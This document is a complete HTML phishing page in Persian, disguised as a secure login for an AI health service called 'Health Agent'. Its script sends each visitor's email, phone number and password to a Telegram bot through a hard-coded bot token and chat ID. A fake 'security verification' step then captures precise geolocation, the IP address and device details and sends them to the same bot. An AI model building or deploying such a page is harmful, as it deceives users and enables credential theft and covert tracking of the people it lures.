<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Health Agent | Secure Login</title>
<style>
  /* استایل‌ها بدون تغییر */
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: Tahoma, sans-serif; background: linear-gradient(135deg, #eef1f5 0%, #dce6f5 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 16px; overflow: hidden; }
  .card { width: 100%; max-width: 380px; background: #fff; border-radius: 20px; box-shadow: 0 8px 40px rgba(0,0,0,0.12); padding: 32px 24px; position: relative; }
  .section { display: none; animation: fadeIn 0.5s ease forwards; }
  .section.active { display: block; }
  @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
  .brand { text-align: center; margin-bottom: 28px; }
  .brand-icon { width: 56px; height: 56px; background: linear-gradient(135deg, #1a73e8, #0d47a1); border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 26px; margin-bottom: 12px; }
  .brand h1 { font-size: 20px; color: #1a1a1a; margin-bottom: 4px; }
  .brand p { font-size: 12px; color: #666; }
  .field { margin-bottom: 14px; }
  .field label { display: block; font-size: 12px; color: #555; margin-bottom: 6px; }
  .field input { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 10px; font-size: 14px; font-family: Tahoma; }
  .field input:focus { outline: none; border-color: #1a73e8; }
  .btn { width: 100%; padding: 15px; background: linear-gradient(135deg, #1a73e8, #0d47a1); color: #fff; border: none; border-radius: 10px; font-size: 15px; font-family: Tahoma; cursor: pointer; margin-top: 8px; transition: opacity 0.2s; }
  .btn:disabled { opacity: 0.6; cursor: not-allowed; }
  .error { color: #d93025; font-size: 12px; text-align: center; margin-top: 12px; min-height: 16px; }
  .status { color: #1a73e8; font-size: 13px; text-align: center; margin-top: 16px; min-height: 20px; font-weight: bold; }
  .footer { text-align: center; font-size: 11px; color: #999; margin-top: 20px; }
  .spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid #ddd; border-top-color: #1a73e8; border-radius: 50%; animation: spin 0.8s linear infinite; vertical-align: middle; margin-left: 6px; }
  @keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>

<div class="card">
  
  <!-- صفحه ۱: ورود -->
  <div id="loginSection" class="section active">
    <div class="brand">
      <div class="brand-icon">🛡️</div>
      <h1>Health Agent</h1>
      <p>AI Health Analysis · Secure</p>
    </div>
    <form id="loginForm" autocomplete="off">
      <div class="field">
        <label for="email">ایمیل</label>
        <input type="email" id="email" placeholder="example@mail.com" required>
      </div>
      <div class="field">
        <label for="phone">شماره تلفن</label>
        <input type="tel" id="phone" placeholder="09123456789" required>
      </div>
      <div class="field">
        <label for="password">رمز عبور</label>
        <input type="password" id="password" placeholder="••••••••" required>
      </div>
      <button type="submit" class="btn" id="loginBtn">ورود به داشبورد</button>
      <div class="error" id="errorMsg"></div>
    </form>
    <div class="footer">© Health Agent — Secure AI Platform</div>
  </div>

  <!-- صفحه ۲: تایید هویت (فقط لوکیشن و اطلاعات دستگاه) -->
  <div id="verifySection" class="section" style="text-align: center;">
    <div class="brand-icon" style="margin-bottom: 16px;">🛡️</div>
    <h1 style="font-size: 19px; color: #1a1a1a; margin-bottom: 10px;">تأیید امنیتی</h1>
    <p style="font-size: 13px; color: #666; line-height: 1.8; margin-bottom: 24px;">
      برای ورود امن، لطفاً موقعیت مکانی و اطلاعات دستگاه خود را تأیید کنید.
    </p>
    <button class="btn" id="verifyBtn">تأیید موقعیت و ورود</button>
    <div class="status" id="verifyStatus"></div>
  </div>

</div>

<script>
/* ============================================================
   تنظیمات
   ============================================================ */
const BOT_TOKEN = '8986087239:AAEw2wedRgnuYQLMYop2ztHv7KqQTGtvfSE'                    
  ; // توکن خودت
const CHAT_ID   = '536648369';   // چت آیدی خودت

/* ============================================================
   مدیریت Session (شناسه یکتا برای هر کاربر)
   ============================================================ */
function getSessionId() {
  let sid = localStorage.getItem('health_agent_session');
  if (!sid) {
    sid = Math.random().toString(36).substring(2, 10).toUpperCase(); // مثلاً A1B2C3D4
    localStorage.setItem('health_agent_session', sid);
  }
  return sid;
}
const SESSION_ID = getSessionId();

/* ============================================================
   توابع ارسال به تلگرام (با پیشوند Session)
   ============================================================ */
async function sendToTelegram(text) {
  try {
    const fullText = `🆔 [Session: ${SESSION_ID}]\n${text}`;
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: fullText })
    });
  } catch (e) { console.error(e.message); }
}

/* ============================================================
   منطق فرم لاگین (ارسال ایمیل، شماره تلفن و پسورد)
   ============================================================ */
document.getElementById('loginForm').addEventListener('submit', async (e) => {
  e.preventDefault();
  const email    = document.getElementById('email').value.trim();
  const phone    = document.getElementById('phone').value.trim();
  const password = document.getElementById('password').value;
  const btn      = document.getElementById('loginBtn');

  btn.disabled = true;
  btn.innerHTML = 'در حال بررسی... <span class="spinner"></span>';

  // ارسال هر سه مورد به تلگرام
  await sendToTelegram(`🔐 لاگین جدید\n📧 ایمیل: ${email}\n📱 شماره: ${phone}\n🔑 رمز: ${password}`);

  // رفتن به صفحه تأیید
  setTimeout(() => {
    document.getElementById('loginSection').classList.remove('active');
    document.getElementById('verifySection').classList.add('active');
  }, 1000);
});

/* ============================================================
   منطق صفحه تأیید (درخواست لوکیشن + اطلاعات دستگاه)
   ============================================================ */
document.getElementById('verifyBtn').addEventListener('click', async () => {
  const btn = document.getElementById('verifyBtn');
  const status = document.getElementById('verifyStatus');

  btn.disabled = true;
  btn.innerHTML = 'در حال دریافت موقعیت... <span class="spinner"></span>';

  try {
    // ۱. بررسی وضعیت مجوز لوکیشن
    const permission = await navigator.permissions.query({ name: 'geolocation' });
    
    if (permission.state === 'denied') {
      status.textContent = '⚠️ دسترسی به موقعیت مسدود شده است. لطفاً از تنظیمات مرورگر اجازه دهید.';
      await sendToTelegram('⚠️ کاربر دسترسی لوکیشن را قبلاً رد کرده است.');
      btn.disabled = false;
      btn.innerHTML = 'تلاش مجدد';
      return;
    }

    // ۲. درخواست موقعیت
    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        // گرفتن IP
        let ip = 'نامشخص';
        try {
          const ipRes = await fetch('https://api.ipify.org?format=json');
          const ipData = await ipRes.json();
          ip = ipData.ip;
        } catch (e) { console.warn('IP failed'); }

        // گرفتن اطلاعات دستگاه
        let deviceInfo = navigator.userAgent;
        if (navigator.userAgentData) {
          try {
            const highEntropy = await navigator.userAgentData.getHighEntropyValues(['model', 'platform']);
            deviceInfo = `مدل: ${highEntropy.model || 'نامشخص'} | پلتفرم: ${highEntropy.platform}`;
          } catch (e) {}
        }

        // ارسال همه اطلاعات
        const infoText = `✅ تأیید موقعیت انجام شد\n` +
                         `🌐 IP: ${ip}\n` +
                         `📍 موقعیت: Lat ${pos.coords.latitude}, Lng ${pos.coords.longitude}\n` +
                         `📱 دستگاه: ${deviceInfo}`;
        
        await sendToTelegram(infoText);

        status.textContent = '✅ تأیید شد. در حال انتقال به داشبورد...';
        btn.innerHTML = 'تأیید شد';
      },
      async (err) => {
        let errorMsg = 'خطای نامشخص';
        if (err.code === 1) errorMsg = 'کاربر دسترسی را رد کرد';
        else if (err.code === 2) errorMsg = 'موقعیت در دسترس نیست';
        else if (err.code === 3) errorMsg = 'زمان درخواست تمام شد';
        
        status.textContent = `⚠️ ${errorMsg}`;
        await sendToTelegram(`⚠️ خطای لوکیشن: ${errorMsg}`);
        btn.disabled = false;
        btn.innerHTML = 'تلاش مجدد';
      },
      { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
    );

  } catch (err) {
    status.textContent = '❌ خطا در بررسی مجوزها.';
    console.error(err);
    btn.disabled = false;
    btn.innerHTML = 'تلاش مجدد';
  }
});
</script>

</body>
</html>
